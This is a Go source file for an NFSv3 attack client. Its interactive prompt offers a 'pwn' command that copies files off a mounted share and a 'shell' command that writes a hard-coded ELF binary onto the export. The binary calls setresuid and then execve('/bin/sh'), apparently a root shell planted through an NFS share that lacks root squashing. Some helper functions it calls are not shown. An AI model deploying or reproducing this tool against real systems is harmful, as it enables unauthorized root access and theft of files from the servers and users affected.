package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"path"
	"strings"

	"github.com/go-nfs/nfsv3/nfs"
	"github.com/go-nfs/nfsv3/nfs/rpc"
)

type ctx_t struct {
	mnt *nfs.Target
	cwd string
}

var commands map[string]func(*ctx_t, string) = make(map[string]func(*ctx_t, string))

func init() {
	commands["pwn"] = xcmd_pwn
	commands["shell"] = xcmd_shell
}

func main() {
	launch_client()
}

func client(auth rpc.Auth, rhost string, target string, priv bool, cmd []string) {
	mount, err := nfs.DialMount(rhost, priv)
	if err != nil {
		panic(err)
	}
	defer mount.Close()

	mnt, err := mount.Mount(target, auth)
	if err != nil {
		panic(err)
	}
	defer mnt.Close()

	var src io.Reader
	if len(cmd) > 0 {
		src = bytes.NewBufferString(strings.Join(cmd, " "))
	} else {
		src = os.Stdin
	}
	reader := bufio.NewReader(src)
	ctx := &ctx_t{
		mnt: mnt,
		cwd: "/",
	}
	for {
		fmt.Printf("%s$ ", path.Join(target, ctx.cwd))
		input, err := reader.ReadString('\n')
		if err != nil && err != io.EOF {
			fmt.Fprint(os.Stderr, err)
			break
		}
		input = strings.TrimSpace(input)

		cmd := input
		args := ""
		if i := strings.Index(cmd, " "); i > 0 {
			cmd = input[:i]
			args = input[i+1:]
		}

		if cb, found := commands[cmd]; found {
			cb(ctx, args)
		} else if cmd != "" {
			fmt.Fprintf(os.Stderr, "command not found: %s\n", cmd)
		}

		if err == io.EOF || cmd == "exit" {
			break
		}
	}
}

func xcmd_pwn(ctx *ctx_t, args string) {
	fn := path.Join(ctx.cwd, args)
	xcmd_open_file(ctx, fn, func(fr *nfs.File) {
		xcmd_create_file(ctx, fn+".pwn", func(fw *nfs.File) {
			io.Copy(fw, fr)
		})
	})
}

func xcmd_shell(ctx *ctx_t, args string) {
	xcmd_create_file(ctx, args, func(f *nfs.File) {
		shell := bytes.NewBuffer([]byte{0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x75, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05})
		io.Copy(f, shell)
	})
}
